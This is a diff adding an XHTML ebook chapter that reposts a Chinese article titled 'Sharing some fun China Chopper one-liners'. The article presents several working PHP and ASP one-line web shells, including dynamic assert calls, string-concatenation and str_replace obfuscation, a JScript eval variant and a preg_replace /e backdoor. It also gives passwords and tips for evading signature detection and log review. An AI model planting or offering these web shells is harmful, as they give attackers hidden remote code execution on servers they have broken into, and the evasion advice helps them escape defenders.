@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>分享几个好玩的菜刀一句话</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>分享几个好玩的菜刀一句话</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=207568219&amp;idx=6&amp;sn=0f355658ed8e9f1e42d7959177230b3a&amp;chksm=121e58bf2569d1a96859aa1bb4725b7a73f02d188105badee84c6601795d6a4aeec4d680b10b&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=207568219&amp;idx=6&amp;sn=0f355658ed8e9f1e42d7959177230b3a&amp;chksm=121e58bf2569d1a96859aa1bb4725b7a73f02d188105badee84c6601795d6a4aeec4d680b10b&amp;scene=27#wechat_redirect</a></blockquote><p style="">&lt;?php $_GET[‘ts7′]($_POST[‘cmd’]);?&gt;</p><p style="">客户端用菜刀，密码cmd，url为test.php?ts7=assert</p><p style="">这个应该算没有什么特征码了，但是缺点就是在web日志中会暴露出来assert</p><p style="">可以都用post：</p><p style="">&lt;?php $_POST[‘ts7′]($_POST[‘cmd’]);?&gt;</p><p style="">在菜刀说明用&lt;O&gt;ts7=assert&lt;/O&gt;post附加数据.</p><p style="">这中间考虑了这些：</p><p style="">&lt;?php<br/>$ts7 = (string)key($_POST);<br/>$ts7($_POST[’assert’]);<br/>?&gt;</p><p style="">猛然发现assert这个关键词又出现了。。<br/>既然字符串可以直接这样用，那还可以这样：</p><p style="">&lt;?php<br/>$a = “a”.”s”.”s”.”e”.”r”.”t”;<br/>$a($_POST[“cmd”]);<br/>?&gt;</p><p style="">或者用$a = str_replace(x,””,”axsxxsxexrxxt”)</p><p style="">以上说来，感觉&lt;?php $_POST[‘ts7′]($_POST[‘cmd’]);?&gt;算是最难查到的一种了。</p><p style="">==========================</p><p style="">ywisax 在论坛上又发了这个：<br/>不知是谁写的 百度了一堆 都没写出处，貌似是lcx写的：</p><p style="">asp版的，这是utf-8编码，自己看着弄吧</p><p style="">&lt;%@LANGUAGE=”JAVASCRIPT” CODEPAGE=”65001″%&gt;</p><p style="">&lt;%</p><p style="">var lcx = {‘名字’ : Request.form(‘#’), ‘性别’ : eval, ‘年龄’ : ‘18′, ‘昵称’ : ‘请叫我一声老大’};</p><p style="">lcx.性别((lcx.名字)+”);</p><p style="">%&gt;</p><p style="">用冰狐就行了</p><p style="">&lt;?php</p><p style="">@preg_replace(“/[email]/e”,$_POST[‘h’],”error”);</p><p style="">?&gt;</p><p style="">菜刀附加数据：<br/>&lt;O&gt;h=@eval($_POST[c]);&lt;/O&gt;</p><p style="">[email]和error你看着换吧，怎么隐蔽怎么来<br/>密码c</p><p><br/></p>
+        
+</body>
+</html>
